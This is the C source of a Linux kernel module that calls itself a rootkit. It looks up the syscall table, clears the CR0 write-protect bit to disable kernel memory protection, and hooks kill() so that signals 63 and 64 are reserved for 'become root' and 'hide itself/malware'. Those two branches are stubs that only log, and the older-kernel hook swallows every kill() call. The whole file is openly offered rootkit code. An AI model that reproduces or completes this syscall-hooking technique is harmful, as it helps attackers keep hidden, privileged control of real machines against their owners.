#include <linux/init.h> //__init, __exit
#include <linux/module.h> //core header for loading modules
#include <linux/kernel.h> //KERN_INFO
#include <linux/kallsyms.h> // kallsyms_lookup_name
#include <linux/unistd.h> // syscall names to numbers
#include <linux/version.h> // LINUX_VERSION_CODE
#include <asm/paravirt.h> //read_cr0, write_cr0
#include <linux/dirent.h> // contains dirent structs etc

// license
MODULE_LICENSE("GPL");
MODULE_AUTHOR("wh1t3r0se");
MODULE_DESCRIPTION("rootkit");
MODULE_VERSION("0.1");

unsigned long *__sys_call_table = NULL;  // NULL == (void*)0

#ifdef CONFIG_X86_64

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0)
#define PTREGS_SYSCALL_STUB 1
typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs);
static ptregs_t orig_kill;
#else
typedef asmlinkage long (*orig_kill_t)(pid_t pid,int sig);
static orig_kill_t orig_kill;
#endif
#endif

enum signals{
    SIGSUPER = 63, // become root
    SIGINVIS = 64, // file invisible
};


#if PTREGS_SYSCALL_STUB

static asmlinkage long hack_kill(const struct pt_regs *regs)
{
    int sig;
    printk(KERN_INFO "***** hacked kill() called *****\n");
    sig = regs->si;
    if (sig == SIGSUPER){
        printk(KERN_INFO "signal: %d == SIGSUPER: %d | become root \n", sig,SIGSUPER);
        return 0;
    }
    else if (sig == SIGINVIS){
        printk(KERN_INFO "signal: %d == SIGINVIS: %d | hide itself/malware/etc \n", sig,SIGINVIS);
        return 0;
    }
 
    return orig_kill(regs);
}

#else

static asmlinkage long hack_kill(pid_t pid,int sig) 
{
    printk(KERN_INFO "***** hacked kill() called *****\n");
    if (sig == SIGSUPER){
        printk(KERN_INFO "signal: %d == SIGSUPER: %d | become root \n", sig,SIGSUPER);
        return 0;
    }
    else if (sig == SIGINVIS){
        printk(KERN_INFO "signal: %d == SIGINVIS: %d | hide itself/malware/etc \n", sig,SIGINVIS);
        return 0;
    }
    return 0;
}

#endif

static int cleanup(void)
{
    // kill
    __sys_call_table[__NR_kill] = (unsigned long)orig_kill;
    return 0;
}

static int store(void)
{
    #if PTREGS_SYSCALL_STUB
        // kill
        orig_kill = (ptregs_t)__sys_call_table[__NR_kill];
        printk(KERN_INFO "orig_kill table entry succesfully stored\n");
    #else
        // kill
        orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];
        printk(KERN_INFO "orig_kill table entry succesfully stored\n");

    #endif

    return 0;
}

static int hook(void)
{
        // kill
        __sys_call_table[__NR_kill] = (unsigned long)&hack_kill;
        printk(KERN_INFO "rootkit: [+] kill table entry succesfully hooked\n");

    return 0;
}


static inline void write_cr0_forced(unsigned long val)
{
    unsigned long __force_order;

    asm volatile(
        "mov %0, %%cr0"
        : "+r" (val), "+m" (__force_order));
}

static void unprotect_memory(void)
{
    write_cr0_forced(read_cr0() & (~0x10000));
    printk(KERN_INFO "rootkit: [-] memory protection disabled\n");
}

static void protect_memory(void)
{
    write_cr0_forced(read_cr0() | 0x10000);
    printk(KERN_INFO "rootkit: [+] memory protection enabled\n");
}

static unsigned long *get_syscall_table(void)
{
    unsigned long *syscall_table;

    #if LINUX_VERSION_CODE > KERNEL_VERSION(4,4,0)
        syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
    #else
        syscall_table = NULL;
    #endif

    return syscall_table;
}

static int  __init mod_init(void)
{
    printk(KERN_INFO "rootkit: [+] hacks loaded\n");

    __sys_call_table = get_syscall_table();
    
    if (!__sys_call_table)
    {
        printk(KERN_INFO "error: [-] syscall table not found\n");
        return -1;
    }
    else printk(KERN_INFO "rootkit: [+] syscall table found at %p\n", __sys_call_table);
    
    if(store()){
        printk(KERN_INFO "error: [-] failed to store original syscall table\n");
        return -1;
    }

    unprotect_memory();

    if(hook()){
        printk(KERN_INFO "error: [-] failed to hook syscall table\n");
        return -1;
    }
    protect_memory();

    return 0;
}

static void __exit mod_exit(void)
{
    printk(KERN_INFO "rootkit: [-] hacks unloaded\n");
    unprotect_memory();
    if(cleanup())
        printk(KERN_INFO "error: [-] failed to cleanup\n");
    protect_memory();
    
}

module_init(mod_init);
module_exit(mod_exit);

